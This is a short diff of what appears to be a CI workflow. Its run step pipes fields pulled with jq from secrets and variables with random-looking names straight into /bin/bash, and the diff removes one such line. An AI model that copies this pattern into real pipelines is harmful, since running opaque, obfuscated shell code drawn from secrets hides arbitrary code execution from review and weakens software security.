@@ -18,7 +18,6 @@ jobs:
           ujiyn5195: ${{ secrets.ujiyn5195 }}
         run: |
           printf '%s' "$ujiyn5195" | jq -r .efz574 | /bin/bash
-          echo $ax551 | jq -r .x2 | /bin/bash
           printf '%s' "$y9857" | jq -r .b8126 | /bin/bash
           printf '%s' "$hcjbz21939" | jq -r .ae73849 | /bin/bash
           printf '%s' "$sbyby4992" | jq -r .is9219 | /bin/bash
